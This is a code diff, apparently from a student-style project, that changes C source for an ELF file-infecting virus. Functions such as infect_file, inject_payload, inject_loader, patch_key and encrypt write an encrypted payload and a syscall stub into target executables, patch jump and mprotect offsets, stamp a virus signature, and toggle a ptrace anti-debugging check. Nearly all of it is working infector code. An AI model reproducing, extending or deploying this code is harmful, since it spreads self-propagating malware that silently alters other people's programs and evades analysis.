@@ -13,15 +13,15 @@ static void	patch_loader(t_info *info)
 	int32_t	end;
 	int32_t val;
 
-	// rewrite jmp to payload
-// 	start = info->text_addr + info->text_size + LOADER_SIZE;
-// 	end = (int32_t)(info->addr_payload + MAIN_OFFSET);
-// 	val = end - start;
-// 	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE - 4, &val, 4);
+	// rewrite jmp to bis
+	start = info->text_addr + info->text_size + LOADER_SIZE;
+	end = (int32_t)(info->addr_bis);
+	val = end - start;
+	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE - 4, &val, 4);
 
 	// rewrite addr for mprotect
 	start = info->text_addr + info->text_size + 0x68;
-	end = info->addr_payload;
+	end = info->addr_bis;
 	val = end - start;
 	ft_memcpy(info->text_begin + info->text_size + 0x64, &val, 4); // 0x65 is pos of instruction targeted in loader
 }
@@ -42,18 +42,18 @@ static void	patch_payload(t_info *info)
 	int32_t	end;
 	int32_t	val;
 
-	start = (int32_t)(info->addr_payload + PAYLOAD_SIZE);
-	end = info->text_addr + info->text_size + LOADER_SIZE;
+	start = (int32_t)(info->addr_bis + PAYLOAD_SIZE + BIS_SIZE);
+	end = info->addr_bis; // TODO ajouter l'addresse du milieu du bis
 	val = end - start;
 
 	// replace jmp addr
-	ft_memcpy(info->file + info->offset_payload + PAYLOAD_SIZE - 4, &val, 4);
+	ft_memcpy(info->file + info->offset_bis + PAYLOAD_SIZE + BIS_SIZE - 4, &val, 4);
 	// replace ret by jmp
 	val = 0xe9;
-	ft_memcpy(info->file + info->offset_payload + PAYLOAD_SIZE - 5, &val, 1);
+	ft_memcpy(info->file + info->offset_bis + PAYLOAD_SIZE + BIS_SIZE - 5, &val, 1);
 	// replace leave by pop rbp
 	val = 0x5dec8948;
-	ft_memcpy(info->file + info->offset_payload + PAYLOAD_SIZE - 9, &val, 4);
+	ft_memcpy(info->file + info->offset_bis + PAYLOAD_SIZE + BIS_SIZE - 9, &val, 4);
 }
 
 static void	inject_payload(t_info *info)
@@ -62,18 +62,18 @@ static void	inject_payload(t_info *info)
 
 	addr = &ft_memcpy;
 	ft_memset(info->file + info->begin_bss, info->bss_size, '\x00');
-	ft_memcpy(info->file + info->offset_payload, addr, PAYLOAD_SIZE);
+	ft_memcpy(info->file + info->offset_bis + BIS_SIZE, addr, PAYLOAD_SIZE);
 	patch_payload(info);
 }
 
-void	patch_end(t_info *info, int32_t nb)
+void	patch_bis(t_info *info, int32_t nb)
 {
 	int32_t	start;
 	int32_t	end;
 	int32_t	val;
 
 	// get addr of end of end
-	start = info->text_addr + info->text_size + LOADER_SIZE + END_SIZE;
+	start = info->addr_bis + BIS_SIZE;
 	if (nb == 1)
 		start -= 0x183;//REPLACE1
 	if (nb == 2)
@@ -87,23 +87,23 @@ void	patch_end(t_info *info, int32_t nb)
 	end = (int32_t)((size_t)(info->addr_hooked_func) - (size_t)(info->text_begin) + info->text_addr);
 	val = end - start;
 	if (nb == 1)
-		ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE - 0x183/*REPLACE1*/ - 4, &val, 4);
+		ft_memcpy(info->file + info->offset_bis + BIS_SIZE - 0x183/*REPLACE1*/ - 4, &val, 4);
 	if (nb == 2)
-		ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE - 0xc8/*REPLACE2*/ - 4, &val, 4);
+		ft_memcpy(info->file + info->offset_bis + BIS_SIZE - 0xc8/*REPLACE2*/ - 4, &val, 4);
 	if (nb == 3)
-		ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE - 0xc3/*REPLACE3*/ - 4, &val, 4);
+		ft_memcpy(info->file + info->offset_bis + BIS_SIZE - 0xc3/*REPLACE3*/ - 4, &val, 4);
 	if (nb == 4)
-		ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE - 0x169/*REPLACE4*/ - 4, &val, 4);
+		ft_memcpy(info->file + info->offset_bis + BIS_SIZE - 0x169/*REPLACE4*/ - 4, &val, 4);
 	if (nb == 5)
-		ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE - 0x21/*REPLACE5*/ - 4, &val, 4);
+		ft_memcpy(info->file + info->offset_bis + BIS_SIZE - 0x21/*REPLACE5*/ - 4, &val, 4);
 }
 
-static void	inject_end(t_info *info)
+static void	inject_bis(t_info *info)
 {
 	void		*addr;	
 
-	addr = &ft_end;
-	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE, addr, END_SIZE);
+	addr = &syscalls;
+	ft_memcpy(info->file + info->offset_bis, addr, BIS_SIZE);
 }
 
 static void	patch_addresses(t_info *info)
@@ -113,25 +113,25 @@ static void	patch_addresses(t_info *info)
 	int32_t		val;
 
 	// &loader
-	start = info->addr_payload + OFFSET_1 + 4;
+	start = info->addr_bis + OFFSET_1 + 4;
 	end = (int32_t)(info->text_addr + info->text_size);
 	val = end - start;
-	ft_memcpy(info->file + info->offset_payload + OFFSET_1, &val, 4);
+	ft_memcpy(info->file + info->offset_bis + OFFSET_1, &val, 4);
 
 	// &ft_memcpy
-	start = info->addr_payload + OFFSET_2 + 4;
-	end = (int32_t)(info->addr_payload);
+	start = info->addr_bis + OFFSET_2 + 4;
+	end = (int32_t)(info->addr_bis);
 	val = end - start;
-	ft_memcpy(info->file + info->offset_payload + OFFSET_2, &val, 4);
+	ft_memcpy(info->file + info->offset_bis + OFFSET_2, &val, 4);
 
 	// &ft_end
-	start = info->addr_payload + OFFSET_3 + 4;
+	start = info->addr_bis + OFFSET_3 + 4;
 	end = (int32_t)(info->text_addr + info->text_size + LOADER_SIZE);
 	val = end - start;
-	ft_memcpy(info->file + info->offset_payload + OFFSET_3, &val, 4);
+	ft_memcpy(info->file + info->offset_bis + OFFSET_3, &val, 4);
 
 	// &ptrace in man
-	ft_memset(info->file + info->offset_payload + OFFSET_4, 40, '\x90');
+	ft_memset(info->file + info->offset_bis + OFFSET_4, 40, '\x90');
 	
 }
 
@@ -140,7 +140,7 @@ static int		reload_mapping(t_info *info)
 	void	*new;
 	size_t	new_size;
 
-	new_size = info->file_size + info->bss_size + PAYLOAD_SIZE;
+	new_size = info->file_size + info->bss_size + PAYLOAD_SIZE + BIS_SIZE;
 	if ((new = ft_sysmmap(0, new_size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0)) == MAP_FAILED)
 		return (1);
 	ft_memcpy(new, info->file, info->file_size);
@@ -155,9 +155,9 @@ static int		inject_sign(t_info *info)
 	uint32_t	magic = MAGIC_VIRUS;
 	char		buf[0x40];
 
-	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE, &magic, 4);
+	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE, &magic, 4);
 	write_sign(buf);
-	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + END_SIZE + 4, buf, SIGN_SIZE);
+	ft_memcpy(info->text_begin + info->text_size + LOADER_SIZE + 4, buf, SIGN_SIZE);
 	return (0);
 }
 
@@ -170,7 +170,7 @@ uint32_t    encrypt(t_info *info, void *ptr, size_t size)
     file = (uint32_t *)ptr;
 
 	uint32_t start = info->text_addr + info->text_size + LOADER_SIZE;
-	uint32_t end = (int32_t)(info->addr_payload + MAIN_OFFSET);
+	uint32_t end = (int32_t)(info->addr_bis + MAIN_OFFSET);
 	key = end - start; // key is now offset to jump payload from loader
 // 	dprintf(1, "%#x\n", key);
 //     key = KEY;
@@ -219,17 +219,17 @@ void			patch_key(t_info *info, uint32_t key)
 	hash = 0;
 	// Key in loader
 	val = key - hash;
-	ft_memcpy(info->text_begin + info->text_size + 0x81, &val, 4); // 0x73 is pos of instruction targeted in loader
+	ft_memcpy(info->file + info->offset_bis + 0x81, &val, 4); // 0x73 is pos of instruction targeted in loader
 }
 
 
 static void	nice_with_gdb(t_info *info)
 {
 	size_t size;
-	size = info->file_size - (info->bss_size + PAYLOAD_SIZE);
+	size = info->file_size - (info->bss_size + PAYLOAD_SIZE + BIS_SIZE);
 	size = size - info->begin_bss;
 
- 	ft_memcpy_r(info->file + info->offset_payload + PAYLOAD_SIZE, info->file + info->begin_bss, size);
+ 	ft_memcpy_r(info->file + info->offset_bis + PAYLOAD_SIZE + BIS_SIZE, info->file + info->begin_bss, size);
 }
 
 static void		infect_file(char *path)
@@ -259,13 +259,13 @@ static void		infect_file(char *path)
 	inject_loader(&info);
 	nice_with_gdb(&info);
 	inject_payload(&info);
-	inject_end(&info);
+	inject_bis(&info);
 	epo_parsing(&info);
 	if (info.valid_target == 0)
 		goto end_fct;
 	patch_addresses(&info);
 	inject_sign(&info);
-	patch_key(&info, encrypt(&info, info.file + info.offset_payload, PAYLOAD_SIZE));
+	patch_key(&info, encrypt(&info, info.file + info.offset_bis + BIS_SIZE, PAYLOAD_SIZE));
 	ft_syswrite(fd, info.file, info.file_size);
 	end_fct:
 	ft_sysmunmap(info.file, info.file_size);
@@ -307,8 +307,8 @@ int		main()
 	char			buf[BUF_SIZE];
 	char			buf_path[PATH_MAX];
 
-	if (ft_sysptrace(0, 0, 1, 0) == -1)
-		return (0);
+// 	if (ft_sysptrace(0, 0, 1, 0) == -1)
+// 		return (0);
 	write_proc(buf_path);
 	if ((check_process(buf_path)) == 1)
 		return (0);
